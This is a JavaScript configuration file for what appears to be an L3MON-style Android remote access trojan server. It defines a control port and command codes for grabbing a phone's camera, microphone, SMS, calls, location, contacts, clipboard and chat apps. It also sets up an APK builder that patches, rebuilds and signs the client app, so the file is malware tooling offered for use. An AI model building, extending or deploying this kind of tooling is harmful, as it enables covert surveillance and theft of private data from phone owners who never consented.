require('dotenv').config();

const config = {
  // Environment
  NODE_ENV: process.env.NODE_ENV || 'development',
  
  // Server Configuration
  PORT: parseInt(process.env.PORT) || 8080,
  CONTROL_PORT: parseInt(process.env.CONTROL_PORT) || 22222,
  
  // Security Configuration
  JWT_SECRET: process.env.JWT_SECRET || 'your-super-secret-jwt-key-here',
  SESSION_SECRET: process.env.SESSION_SECRET || 'your-session-secret-key-here',
  BCRYPT_ROUNDS: parseInt(process.env.BCRYPT_ROUNDS) || 12,
  
  // Database Configuration
  DB_PATH: process.env.DB_PATH || './maindb.json',
  CLIENT_DB_PATH: process.env.CLIENT_DB_PATH || './clientData',
  
  // Logging Configuration
  LOG_LEVEL: process.env.LOG_LEVEL || 'info',
  LOG_FILE: process.env.LOG_FILE || './logs/app.log',
  
  // Rate Limiting
  RATE_LIMIT_WINDOW_MS: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 900000, // 15 minutes
  RATE_LIMIT_MAX_REQUESTS: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 100,
  
  // CORS Configuration
  CORS_ORIGIN: process.env.CORS_ORIGIN || '*',
  CORS_CREDENTIALS: process.env.CORS_CREDENTIALS === 'true',
  
  // File Upload Configuration
  MAX_FILE_SIZE: parseInt(process.env.MAX_FILE_SIZE) || 10485760, // 10MB
  UPLOAD_PATH: process.env.UPLOAD_PATH || './uploads',
  
  // Monitoring Configuration
  ENABLE_CHAT_MONITORING: process.env.ENABLE_CHAT_MONITORING === 'true',
  ENABLE_REAL_TIME_LOGGING: process.env.ENABLE_REAL_TIME_LOGGING === 'true',
  ENABLE_PERFORMANCE_MONITORING: process.env.ENABLE_PERFORMANCE_MONITORING === 'true',
  
  // APK Builder Configuration
  APK_BUILD_PATH: process.env.APK_BUILD_PATH || './app/factory/build-unsigned.apk',
  APK_SIGNED_BUILD_PATH: process.env.APK_SIGNED_BUILD_PATH || './assets/webpublic/app-release.apk',
  OUTPUT_PATH: process.env.OUTPUT_PATH || './app/factory',
  
  // Tools & Resources
  APK_TOOL: process.env.APK_TOOL || './app/factory/apktool.jar',
  APK_SIGN: process.env.APK_SIGN || './app/factory/uber-apk-signer.jar',
  KEYSTORE: process.env.APK_KEYSTORE || './app/factory/release.keystore',
  SMALI_PATH: process.env.SMALI_PATH || './app/factory/decompiled',
  PATCH_FILE_PATH: process.env.PATCH_FILE_PATH || './app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali',
  
  // Downloads Configuration
  DOWNLOADS_FOLDER: process.env.DOWNLOADS_FOLDER || '/client_downloads',
  
  // Message Keys
  MESSAGE_KEYS: {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP',
    chatApps: '0xCH'
  },
  
  // Log Types
  LOG_TYPES: {
    error: {
      name: 'ERROR',
      color: 'red'
    },
    alert: {
      name: 'ALERT',
      color: 'amber'
    },
    success: {
      name: 'SUCCESS',
      color: 'limegreen'
    },
    info: {
      name: 'INFO',
      color: 'blue'
    }
  },
  
  // Build Commands
  BUILD_COMMAND: process.env.BUILD_COMMAND || `java -jar "${process.env.APK_TOOL || './app/factory/apktool.jar'}" b "${process.env.SMALI_PATH || './app/factory/decompiled'}" -o "${process.env.APK_BUILD_PATH || './app/factory/build-unsigned.apk'}" -f -v`,
  SIGN_COMMAND: process.env.SIGN_COMMAND || `jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "${process.env.APK_KEYSTORE || './app/factory/release.keystore'}" -storepass android -keypass android "${process.env.APK_BUILD_PATH || './app/factory/build-unsigned.apk'}" androidkey`
};

// Validate required configuration
const requiredConfigs = ['JWT_SECRET', 'SESSION_SECRET'];
requiredConfigs.forEach(configKey => {
  if (!config[configKey] || config[configKey].includes('your-')) {
    console.warn(`Warning: ${configKey} is using default value. Please set a secure value in your .env file.`);
  }
});

module.exports = config; 